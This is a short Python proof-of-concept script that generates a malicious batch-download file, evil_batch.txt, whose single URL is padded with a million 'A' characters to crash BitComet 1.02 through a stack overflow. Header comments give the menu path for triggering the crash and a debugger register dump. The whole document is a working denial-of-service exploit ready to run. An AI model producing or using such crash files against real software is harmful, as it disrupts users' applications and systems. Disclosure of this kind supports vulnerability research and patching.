#!/usr/bin/python
# BitComet 1.02 [HTTP/FTP Batch Download] url DOS
#This python script will generate an evil_batch.txt file that when
#loaded into bitcomet for batch downloading it will result in a crash.
#The vulnerability resides in failure to handle overly long urls.
#(File->HTTP/FTP Batch Download->Import URL from file->OK)
#Debug output:
#              ----------------------------------------------------------------
#              Exception C00000FD (STACK_OVERFLOW)
#              ----------------------------------------------------------------
#              EAX=00032000: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00
#              EBX=06E90020: 41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00
#              ECX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
#              EDX=7C90EB94: C3 8D A4 24 00 00 00 00-8D 64 24 00 90 90 90 90
#              ESP=0012B354: 66 9A 80 7C 5C 85 57 00-5C F9 B1 00 00 F0 5F 01
#              EBP=0012B380: 04 B4 12 00 83 8B 57 00-20 00 E9 06 50 00 00 00
#              ESI=015FF000: 14 CB 99 00 E4 05 00 00-06 00 00 00 3F 00 00 00
#              EDI=001E8482: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00
#              EIP=00707E07: 85 00 EB E9 55 8B EC 51-53 56 8B F0 33 DB 3B F3
#                            --> TEST [EAX],EAX
#              ----------------------------------------------------------------
#
#
#Found by: Shinnok raydenxy [at] yahoo dot com
batch = 'http://'
badstr = 'A' * 1000000
batch += badstr

f = open('evil_batch.txt','wb')
f.write(batch);
f.close